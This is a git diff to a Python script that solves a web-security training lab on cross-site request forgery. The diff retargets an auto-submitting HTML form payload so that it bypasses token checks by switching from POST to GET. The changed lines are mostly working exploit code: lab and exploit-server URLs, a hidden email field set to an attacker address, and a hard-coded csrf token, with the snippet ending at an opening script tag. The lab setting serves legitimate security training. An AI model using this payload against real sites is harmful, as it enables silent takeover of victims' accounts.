@@ -4,7 +4,7 @@
 #
 # Date: 21/10/2023
 #
-# Lab: CSRF vulnerability with no defenses
+# Lab: CSRF where token validation depends on request method
 #
 # Steps: 1. Deliver the exploit to the victim
 #        2. The victim's email will be changed after he trigger the exploit
@@ -24,10 +24,10 @@ import re
 #########
 
 # change this to your lab URL
-lab_url = "https://0ac300660457354a80fdc17d008e000f.web-security-academy.net"
+lab_url = "https://0a0700bc0316f4e282e9a7df001f00c9.web-security-academy.net"
 
 # change this to your exploit server URL
-exploit_server_url = "https://exploit-0a7e00bd04a235f880eac08e019d00ff.exploit-server.net"
+exploit_server_url = "https://exploit-0a5800960328f4fe82faa699011900fc.exploit-server.net"
 
 # the header of your exploit sever response
 exploit_server_head = """HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"""
@@ -39,8 +39,9 @@ new_email = "hacked@you.com"
 # payload to change the victim's email
 payload = f"""<html>
                 <body>
-                <form action="{lab_url}/my-account/change-email" method="POST">
+                <form action="{lab_url}/my-account/change-email">
                     <input type="hidden" name="email" value="{new_email}" />
+                    <input type="hidden" name="csrf" value="b2eUm7UybY24D3Jjnda5t2OUib3N2Cvr" />
                     <input type="submit" value="Submit request" />
                 </form>
                 <script>
